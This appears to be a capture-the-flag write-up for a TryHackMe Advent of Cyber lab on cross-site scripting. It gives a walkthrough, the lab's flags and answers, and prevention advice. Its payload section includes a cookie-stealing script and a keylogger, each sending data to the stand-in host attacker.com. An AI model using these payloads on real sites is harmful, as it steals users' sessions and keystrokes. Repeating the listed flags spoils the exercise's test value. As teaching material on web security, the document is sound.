# 🎄 Advent of Cyber 2025 - Day 11: XSS - Merry XSSMas

[![TryHackMe](https://img.shields.io/badge/TryHackMe-Advent%20of%20Cyber%202025-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)](https://tryhackme.com)
[![Duration](https://img.shields.io/badge/Duration-30%20min-blue?style=for-the-badge)](https://tryhackme.com)
[![OWASP](https://img.shields.io/badge/OWASP-Top%2010-critical?style=for-the-badge)](https://owasp.org)

## 📖 Overview

Day 11 explores Cross-Site Scripting (XSS)—one of the most common web vulnerabilities. Learn to identify, exploit, and prevent both Reflected and Stored XSS attacks.

### 🎯 Learning Objectives

- Understand XSS mechanisms
- Differentiate between Reflected and Stored XSS
- Exploit XSS vulnerabilities
- Learn prevention techniques

## 🔍 Investigation Summary

**Threat Vector:** XSS injection in message portal  
**Target:** McSkidy's secure portal  
**Vulnerability Types:** Reflected XSS + Stored XSS  
**Impact:** Code execution in user browsers  

## 💉 Understanding XSS

### What is Cross-Site Scripting?

**XSS** allows attackers to inject malicious scripts into web pages viewed by other users.

**Attack Flow:**
```
1. Attacker injects malicious script
2. Application fails to sanitize input
3. Script stored or reflected to users
4. Browser interprets input as code
5. Malicious script executes
```

### Types of XSS

#### 1. Reflected XSS ⚡

**Characteristics:**
- Temporary (not stored)
- Requires victim to click malicious link
- Targets specific victims
- Common in search bars, error messages

**Example:**
```
Normal: https://site.com/search?q=gifts
Malicious: https://site.com/search?q=<script>alert('XSS')</script>
```

#### 2. Stored XSS 💾

**Characteristics:**
- Persistent (stored on server)
- Affects all users viewing page
- No interaction needed
- More dangerous than Reflected

**Example:**
```html
<!-- Comment stored in database -->
<script>alert('Stored XSS')</script>
```

## 📝 Complete Walkthrough

### Setup

**Target:** `http://10.67.152.5`  
**Tool:** AttackBox browser

### Phase 1: Reflected XSS

**Step 1: Test Search Function**

**Payload:**
```html
<script>alert('Reflected Meow Meow')</script>
```

**Actions:**
1. Enter payload in search bar
2. Click "Search Messages"
3. Alert appears = Vulnerable

**Step 2: Extract Flag**

**Payload:**
```html
<script>alert(atob("VEhNe0V2aWxfQnVubnl9"))</script>
```

**What it does:**
- `atob()` decodes Base64
- `VEhNe0V2aWxfQnVubnl9` → `THM{Evil_Bunny}`

**🚩 Answer:** `THM{Evil_Bunny}`

### Phase 2: Stored XSS

**Step 1: Test Message Form**

**Payload:**
```html
<script>alert('Stored Meow Meow')</script>
```

**Actions:**
1. Navigate to message form
2. Submit payload
3. Alert appears
4. Refresh page → Alert persists

**Step 2: Extract Flag**

**Payload:**
```html
<script>alert(atob("VEhNe0V2aWxfU3RvcmVkX0VnZ30="))</script>
```

**Decodes to:** `THM{Evil_Stored_Egg}`

**🚩 Answer:** `THM{Evil_Stored_Egg}`

## 🏆 Challenge Answers

| Question | Answer |
|----------|--------|
| Which type requires backend persistence? | `stored` |
| Reflected XSS flag | `THM{Evil_Bunny}` |
| Stored XSS flag | `THM{Evil_Stored_Egg}` |

## 📊 XSS Comparison

| Aspect | Reflected | Stored |
|--------|-----------|--------|
| **Storage** | Temporary | Persistent |
| **Trigger** | Click malicious link | View page |
| **Scope** | Individual victims | All users |
| **Persistence** | Single execution | Multiple executions |
| **Severity** | Medium-High | High-Critical |

## 🛡️ Prevention Techniques

### 1. Input Validation

```javascript
// Bad: Accept anything
let userInput = request.body.comment;

// Good: Validate
if (!/^[a-zA-Z0-9\s.,!?'-]+$/.test(userInput)) {
  return res.status(400).send("Invalid input");
}
```

### 2. Output Encoding

```javascript
// Bad: Direct injection
element.innerHTML = userInput;

// Good: Treat as text
element.textContent = userInput;

// Good: HTML encoding
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}
```

### 3. Content Security Policy

```http
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### 4. Secure Cookies

```javascript
res.cookie('session', token, {
  httpOnly: true,    // Not accessible via JS
  secure: true,      // HTTPS only
  sameSite: 'strict' // Prevent CSRF
});
```

### 5. Use Modern Frameworks

- **React**: Auto-escapes by default
- **Angular**: Built-in sanitization
- **Vue.js**: Template escaping

**Warning:** Developers can still introduce XSS via:
- `dangerouslySetInnerHTML` (React)
- Unsafe template interpolation
- Direct DOM manipulation

## 💣 Common XSS Payloads

### Basic Tests

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### Cookie Stealing

```html
<script>
  document.location='http://attacker.com/?c='+document.cookie
</script>
```

### Keylogger

```html
<script>
  document.onkeypress = function(e) {
    fetch('http://attacker.com/log?key=' + e.key);
  }
</script>
```

## 🎯 Real-World Impact

### Attack Scenarios

**Reflected XSS → Phishing:**
```
1. Craft malicious URL with XSS
2. Send via phishing email
3. Victim clicks → Session stolen
4. Account hijacked
```

**Stored XSS → Mass Compromise:**
```
1. Inject script into popular forum
2. Script stored in database
3. Every viewer executes script
4. Mass credential harvest
```

### Notable Incidents

- **MySpace Samy Worm (2005)**: 1 million friend requests in 20 hours
- **TweetDeck XSS (2014)**: Self-retweeting XSS worm
- **British Airways (2018)**: Payment page XSS, 380K records stolen

## 🎓 Key Takeaways

### XSS Fundamentals

✅ XSS = Code injection into web pages  
✅ Reflected = Temporary, phishing-based  
✅ Stored = Persistent, affects all users  
✅ Root cause = Insufficient input validation  
✅ Impact = Session theft to full compromise  

### Security Principles

✅ Never trust user input  
✅ Validate everything  
✅ Encode all output  
✅ Use HttpOnly cookies  
✅ Implement CSP  
✅ Defense in depth  

### Prevention Checklist

- [ ] Validate all user input
- [ ] Encode all output
- [ ] Use `textContent` not `innerHTML`
- [ ] Set HttpOnly/Secure cookie flags
- [ ] Implement Content Security Policy
- [ ] Use framework protections
- [ ] Regular security testing
- [ ] Code review for XSS

## 🔗 Related Resources

### TryHackMe Rooms
- [Intro to Cross-site Scripting](https://tryhackme.com)
- [XSS Playground](https://tryhackme.com)
- [OWASP Top 10](https://tryhackme.com)

### External Resources
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Payloads](https://github.com/payloadbox/xss-payload-list)

## 🤝 Contributing

Improvements welcome! Open a PR.

## 📜 License

Educational purposes only. All credit to TryHackMe and Advent of Cyber 2025.

---

⭐ **Found this helpful? Star the repo!**

🔒 **Day 11/25 Complete - Sanitize all the things!**
